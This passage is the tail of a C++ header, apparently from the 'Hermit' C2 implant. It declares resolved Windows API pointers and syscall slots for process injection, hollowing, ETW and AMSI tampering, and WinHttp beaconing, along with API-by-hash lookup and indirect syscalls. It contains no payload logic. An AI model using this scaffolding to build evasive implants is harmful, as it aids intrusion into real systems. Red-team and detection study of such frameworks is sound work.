        LPPROC_REGSAVEKEYW                  lpRegSaveKeyW                       = nullptr;
        LPPROC_REGSETVALUEEXW               lpRegSetValueExW                    = nullptr;
        LPPROC_REMOVEDIRECTORYW             lpRemoveDirectoryW                  = nullptr;
        LPPROC_REVERTTOSELF                 lpRevertToSelf                      = nullptr;
        LPPROC_RTLCOPYMEMORY                lpRtlCopyMemory                     = nullptr;
        LPPROC_SETFILEINFORMATIONBYHANDLE   lpSetFileInformationByHandle        = nullptr;
        LPPROC_SETHANDLEINFORMATION         lpSetHandleInformation              = nullptr;
        LPPROC_SETTHREADCONTEXT             lpSetThreadContext                  = nullptr;
        LPPROC_SHELLEXECUTEEXW              lpShellExecuteExW                   = nullptr;
        LPPROC_SHOWWINDOW                   lpShowWindow                        = nullptr;
        LPPROC_SYSTEMTIMETOFILETIME         lpSystemTimeToFileTime              = nullptr;
        LPPROC_TERMINATEPROCESS             lpTerminateProcess                  = nullptr;
        LPPROC_TRANSLATEACCELERATORW        lpTranslateAcceleratorW             = nullptr;
        LPPROC_TRANSLATEMESSAGE             lpTranslateMessage                  = nullptr;
        LPPROC_UPDATEWINDOW                 lpUpdateWindow                      = nullptr;
        LPPROC_VIRTUALALLOCEX               lpVirtualAllocEx                    = nullptr;
        LPPROC_VIRTUALFREE                  lpVirtualFree                       = nullptr;
        LPPROC_VIRTUALPROTECT               lpVirtualProtect                    = nullptr;
        LPPROC_VIRTUALPROTECTEX             lpVirtualProtectEx                  = nullptr;
        LPPROC_WINHTTPCLOSEHANDLE           lpWinHttpCloseHandle                = nullptr;
        LPPROC_WINHTTPCONNECT               lpWinHttpConnect                    = nullptr;
        LPPROC_WINHTTPOPEN                  lpWinHttpOpen                       = nullptr;
        LPPROC_WINHTTPOPENREQUEST           lpWinHttpOpenRequest                = nullptr;
        LPPROC_WINHTTPQUERYDATAAVAILABLE    lpWinHttpQueryDataAvailable         = nullptr;
        LPPROC_WINHTTPQUERYHEADERS          lpWinHttpQueryHeaders               = nullptr;
        LPPROC_WINHTTPREADDATA              lpWinHttpReadData                   = nullptr;
        LPPROC_WINHTTPRECEIVERESPONSE       lpWinHttpReceiveResponse            = nullptr;
        LPPROC_WINHTTPSENDREQUEST           lpWinHttpSendRequest                = nullptr;
        LPPROC_WINHTTPSETOPTION             lpWinHttpSetOption                  = nullptr;
        LPPROC_WINHTTPWRITEDATA             lpWinHttpWriteData                  = nullptr;
        LPPROC_WRITEPROCESSMEMORY           lpWriteProcessMemory                = nullptr;
        LPPROC_WSACLEANUP                   lpWSACleanup                        = nullptr;
        LPPROC_WSASTARTUP                   lpWSAStartup                        = nullptr;

        // **SYSCALLS**
        Syscalls::SYSCALL                   sysEtwEventWrite                    = {0};
        Syscalls::SYSCALL                   sysLdrLoadDll                       = {0};
        Syscalls::SYSCALL                   sysNtAdjustPrivilegesToken          = {0};
        Syscalls::SYSCALL                   sysNtAllocateVirtualMemory          = {0};
        Syscalls::SYSCALL                   sysNtClose                          = {0};
        Syscalls::SYSCALL                   sysNtCreateFile                     = {0};
        Syscalls::SYSCALL                   sysNtCreateNamedPipeFile            = {0};
        Syscalls::SYSCALL                   sysNtCreateProcessEx                = {0};
        Syscalls::SYSCALL                   sysNtCreateThreadEx                 = {0};
        Syscalls::SYSCALL                   sysNtDeleteFile                     = {0};
        Syscalls::SYSCALL                   sysNtDuplicateObject                = {0};
        Syscalls::SYSCALL                   sysNtEnumerateValueKey              = {0};
        Syscalls::SYSCALL                   sysNtFlushInstructionCache          = {0};
        Syscalls::SYSCALL                   sysNtFreeVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtGetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtOpenFile                       = {0};
        Syscalls::SYSCALL                   sysNtOpenKeyEx                      = {0};
        Syscalls::SYSCALL                   sysNtOpenProcess                    = {0};
        Syscalls::SYSCALL                   sysNtOpenProcessToken               = {0};
        Syscalls::SYSCALL                   sysNtPrivilegeCheck                 = {0};
        Syscalls::SYSCALL                   sysNtProtectVirtualMemory           = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationFile           = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationProcess        = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationToken          = {0};
        Syscalls::SYSCALL                   sysNtQueryKey                       = {0};
        Syscalls::SYSCALL                   sysNtQuerySystemInformation         = {0};
        Syscalls::SYSCALL                   sysNtReadFile                       = {0};
        Syscalls::SYSCALL                   sysNtReadVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtResumeThread                   = {0};
        Syscalls::SYSCALL                   sysNtSetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtSetInformationFile             = {0};
        Syscalls::SYSCALL                   sysNtSetInformationProcess          = {0};
        Syscalls::SYSCALL                   sysNtSystemDebugControl             = {0};
        Syscalls::SYSCALL                   sysNtTerminateProcess               = {0};
        Syscalls::SYSCALL                   sysNtTraceEvent                     = {0};
        Syscalls::SYSCALL                   sysNtUnmapViewOfSection             = {0};
        Syscalls::SYSCALL                   sysNtWaitForSingleObject            = {0};
        Syscalls::SYSCALL                   sysNtWriteFile                      = {0};
        Syscalls::SYSCALL                   sysNtWriteVirtualMemory             = {0};
        Syscalls::SYSCALL                   sysRtlAllocateHeap                  = {0};
        Syscalls::SYSCALL                   sysRtlExpandEnvironmentStrings      = {0};
        Syscalls::SYSCALL                   sysRtlGetCurrentDirectory_U         = {0};
        Syscalls::SYSCALL                   sysRtlGetFullPathName_U             = {0};
        Syscalls::SYSCALL                   sysRtlInitUnicodeString             = {0};
        Syscalls::SYSCALL                   sysRtlQuerySystemInformation        = {0};
        Syscalls::SYSCALL                   sysRtlSetCurrentDirectory_U         = {0};
    };
    typedef PROCS* PPROCS;

    DWORD StringToHashFunc(char* str);
    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD dwHash
    );
    VOID FindProcs(
        Procs::PPROCS pProcs,
        HMODULE hNtdll,
        HMODULE hKernel32,
        BOOL bIndirectSyscalls
    );
    VOID FindProcsMisc(
        Procs::PPROCS pProcs,
        HMODULE hAdvapi32,
        HMODULE hAmsi,
        HMODULE hBcrypt,
        HMODULE hCrypt32,
        HMODULE hDbghelp,
        HMODULE hIphlpapi,
        HMODULE hNetapi32,
        HMODULE hShell32,
        HMODULE hUser32,
        HMODULE hWinHttp,
        HMODULE hWs2_32
    );
}

#endif // HERMIT_CORE_PROCS_HPP
